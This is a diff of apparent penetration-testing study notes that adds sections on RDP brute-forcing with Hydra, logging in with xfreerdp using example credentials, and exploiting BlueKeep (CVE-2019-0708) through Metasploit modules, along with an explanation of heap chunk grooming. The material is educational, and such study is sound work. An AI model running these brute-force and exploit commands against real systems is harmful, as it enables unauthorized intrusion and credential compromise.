@@ -1,13 +1,18 @@
 ##### Table Of Contents
 1. [Windows Vulnerabilities](System_Host%20Based%20Attacks.md#windows-vulnerabilities)
 2. [Exploiting Windows Vulnerabilities](System_Host%20Based%20Attacks.md#exploiting-windows-vulnerabilities)
-3. [Windows Privilege Escalation](System_Host%20Based%20Attacks.md#windows-privilege-escalation)
-4. [Windows File System Vulnerabilities](System_Host%20Based%20Attacks.md#windows-file-system-vulnerabilities)
-5. [Windows Credential Dumping](System_Host%20Based%20Attacks.md#windows-credential-dumping)
-6. [Linux Vulnerabilities](System_Host%20Based%20Attacks.md#linux-vulnerabilities)
-7. [Exploiting Linux Vulnerabilities](System_Host%20Based%20Attacks.md#exploiting-linux-vulnerabilities)
-8. [Linux Privilege Escalation](System_Host%20Based%20Attacks.md#linux-privilege-escalation)
-9. [Linux Credential Dumping](System_Host%20Based%20Attacks.md#linux-credential-dumping)
+	- IIS and WebDav
+	- SMB Exploitation with PsExec
+	- EternalBlue
+	- RDP
+	- BlueKeep
+1. [Windows Privilege Escalation](System_Host%20Based%20Attacks.md#windows-privilege-escalation)
+2. [Windows File System Vulnerabilities](System_Host%20Based%20Attacks.md#windows-file-system-vulnerabilities)
+3. [Windows Credential Dumping](System_Host%20Based%20Attacks.md#windows-credential-dumping)
+4. [Linux Vulnerabilities](System_Host%20Based%20Attacks.md#linux-vulnerabilities)
+5. [Exploiting Linux Vulnerabilities](System_Host%20Based%20Attacks.md#exploiting-linux-vulnerabilities)
+6. [Linux Privilege Escalation](System_Host%20Based%20Attacks.md#linux-privilege-escalation)
+7. [Linux Credential Dumping](System_Host%20Based%20Attacks.md#linux-credential-dumping)
 
 
 ---
@@ -301,11 +306,7 @@ exploit
 
 
 
-
-
-
-
-## SMB Exploitation with PsExec
+## SMB-Exploitation-with-PsExec
 
 SMB (Server Message Block) is a network file-sharing protocol used primarily for sharing files, printers, and other peripherals within a local network. Initially, SMB ran over NetBIOS using port 139 but has since migrated to operate over TCP on port 445. SAMBA is the open-source implementation of SMB on Linux, which allows interoperability with Windows systems, enabling file and device sharing.
 ##### SMB Authentication Process
@@ -542,6 +543,160 @@ set RHOSTS 10.82.54.22
 
 After configuring changes, run the exploit using `exploit`. The exploit is done and a meterpreter session should be established. The username allowed should be NT AUTHORITY\\SYSTEM
 
+
+### RDP
+
+The Remote Desktop Protocol (RDP), developed by Microsoft, is used to remotely connect and interact with Windows systems. By default, it operates on TCP port 3389, though it can be configured to use other ports. Its common common that RDP could be running on a different port. RDP authentication requires a valid user account and the associated password in clear text. <u>We can exploit RDP by performing brute-force attacks to identify valid user credentials  and gain remote access to the target</u>. 
+
+1. **Perform an initial Nmap scan against the target**: Make sure to scan the entire TCP port range `-p-` since RDP could be configured on a different port. Can also ran this as a SYN Scan `-sS` to make this more stealthier.
+```
+nmap -sV -O -sS -p- target
+```
+
+If you don't see a RDP confirmed on port 3389 or as a service you have two options:
+- **Option A**: Connecting directly to RDP on that target and specify the port you believe to be for RDP
+- **Option B**: Run the metasploit RDP scanner to confirm if RDP is available on the system.
+
+
+#### Checking for RDP using Metasploit
+
+We can use the rdp_scanner auxiliary module which would check the ports to see if it can communicate using RDP:
+
+1. Start Postgresql/Metasploit console:
+```
+service postgresql && msfconsole
+```
+2. Either search for `rdp_scanner` or use `auxiliary/scanner/rdp/rdp_scanner` 
+```
+search rdp_scanner
+
+use auxiliary/scanner/rdp/rdp_scanner
+```
+3. **Configure the module**: We'll need to set the target address using `RHOSTS` and then specify the `RPORT` to a port we believe RDP is running on.
+
+```
+set RHOSTS 192.168.41.2
+
+set RPORT 4876
+```
+
+4. **Run the scanner**: Use `run` to execute the scanner, it should return build number and some other hostname information of the target also. After getting a confirmation of RDP running on the target, we can brute force to find credentials.
+
+##### Perform Brute Force using Hydra
+
+Hydra can be used here to perform a brute force against the RDP service on the target. Be aware that this could cause a DoS event so the speed of the brute force might need to be adjusted depending on the environment. You need to specify the user name list `-L`, the password list `-P` the protocol like for RDP it would be `rdp://` and the port number `-s`.
+
+- Example User Wordlist: `/usr/share/metasploit-framework/data/wordlists/common_users.txt`
+- Example Password Wordlist: `/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`
+
+```
+hydra -L user_list  -P  password_list  protocol://target -s port_number 
+```
+
+Example:
+```
+hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P  /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.42.2.41 -s 3333 
+```
+
+Hydra will try to actually to connect with any valid credentials using the freerdp client. We'll be using `xfreerdp` to actually connect to the target system.
+
+#### Connect to the Target using XfreeRDP
+
+**xfreerdp** is an open-source client that allows users to connect to a remote desktop server using the Remote Desktop Protocol (RDP). It is part of the FreeRDP project and is commonly used in Linux environments to connect to Windows machines. We need to specify the username `/u:` the password `/p:` , the target `/v:` and its port number:
+
+```
+xfreerdp /u:username /p:password /v:target_ip:rdp_port_number
+```
+
+Example:
+```
+xfreerdp /u:administrator /p:qwertyuiop /v:10.24.5.1:3333
+```
+
+This will return the RDP GUI windows for the target.
+
+## BlueKeep
+
+BlueKeep (CVE-2019-0708) is a inherent remote code execution vulnerability in the Windows RDP protocol, publicly disclosed by Microsoft in 2019. Instead of brute forcing for valid user accounts, the vulnerability exploits a flaw in the RDP protocol itself by <u>gaining access to a chunk of kernel memory</u> and remotely executing arbitrary code at the system level without authentication. Attackers specifically target the kernel because it operates in a highly privileged space, so any code ran there will inherit elevated privileges. For instance, executing a meterpreter payload in the kernel would grant a session with elevated access. However, executing code at the kernel level also carries the risk of causing system instability or crashes. Microsoft released a patch for this vulnerability on May 14th, 2019. The BlueKeep vulnerability affects multiple versions of Windows XP/Vista/7 and Windows Server 2008 & R2.
+
+The exploit will fail unless the following prerequisites are met:
+1. RDP needs to be enabled
+2. Network-level authentication (NLA) can't be enabled
+
+The BlueKeep vulnerability has illegitimate proof of concepts (PoCs) and exploit code that could be malicious, potentially performing tasks unrelated to the exploit itself. Microsoft did not release public PoCs or exploit code for BlueKeep, as doing so would have worsened the vulnerability's impact. Security researchers created PoCs without payloads, demonstrating the vulnerability by performing non-malicious actions like creating files, rather than executing reverse shells. It's recommended to only use verified exploit code to avoid malicious variants.
+
+The BlueKeep exploit includes an MSF auxiliary module to check if a system is vulnerable and an exploit module to target unpatched systems. However, the exploit requires adjustments based on the Windows version and the memory chunk size needed to execute the code. When successful, the exploit provides a standard command shell or a meterpreter session on the target.
+
+1. Perform a port scan to confirm if RDP is running on the target:
+```
+nmap -p 3389 target
+```
+2. Run the metasploit auxiliary module to confirm if the version of RDP is vulnerable. Start metasploit with `msfconsole`, and then search '`Bluekeep`':
+```
+search Bluekeep
+```
+The results will have the auxiliary module `auxiliary/scanner/rdp/cve_2019_0708_bluekeep` and the exploit, the exploit will also run the aux scanner module. 
+```
+use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
+### or "use 0/1" ##
+```
+Make any configuration changes for the scanner
+- `RHOSTS` = The target host
+- `RPORT` = Change if RDP is running on a different port from its default
+```
+set RHOSTS 10.69.65.2
+```
+Type `run`  to start the scan
+```
+run
+```
+
+Run the exploit:
+
+We can select the exploit `exploit/windows/rdp/cve_2019_0708_bluekeep_rce` 
+```
+use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+### or "use 0/1" ##
+```
+
+Configure the module options:
+- `RHOSTS` = The target host
+- `RPORT` = Change if RDP is running on a different port from its default
+```
+set RHOSTS 10.69.65.2
+```
+
+Configure the payload options 
+- `LHOST` (Listening Host) = Your local machine
+- `LPORT`(Listening Port) = The port on your system to listen
+
+Just type `exploit`  to run the exploit
+```
+exploit
+```
+
+Might get a `bad-config` response if you don't specify a target, the module gives the ability to specify the target configuration or version of Windows to target
+
+```
+show targets
+```
+
+Set target to whatever the ID of the OS running on the target
+```
+set target 2
+```
+
+Part of the output would include something along the lines of `Using CHUNK Grooming strategy. Size 250MB, target address 0xfffffx8011e07000, Channel count 1`.
+
+**Grooming** is the process of preparing a system’s memory or other states to manipulate how resources—such as memory blocks or file handles—are allocated or managed. The goal of grooming is to position vulnerable memory segments in predictable locations, making it easier for an exploit to succeed by taking advantage of these weaknesses.
+
+A common form of grooming is **chunk grooming**, which specifically targets heap memory. The **heap** is a region of memory used for dynamic allocation during the runtime of programs. It's structured into units called **chunks**, which vary in size. Chunk grooming involves controlling how these chunks are allocated and placed, ensuring that vulnerable memory blocks are aligned in a way that increases the likelihood of a successful attack.
+
+In this case, the groomer reserves large blocks of memory in RAM —such as the `250MB` mentioned in the output. By doing so, it forces the operating system to place the vulnerable memory segment (at the address `0xfffffx8011e07000`) in a location that the attacker can predict. Without this grooming, memory could be allocated randomly, which would make it much harder for the exploit to reliably target and manipulate the vulnerable segment. By carefully "grooming" the memory layout, the attacker increases the likelihood that their code will be successfully executed. 
+
+You can try adjusting the size of memory used if this fails.
+
+After the exploit is done, the meterpreter session should be allowed. This works like EternalBlue where we didn't need to elevate our privileges to get admin access. 
 
 # Windows-Privilege-Escalation
 
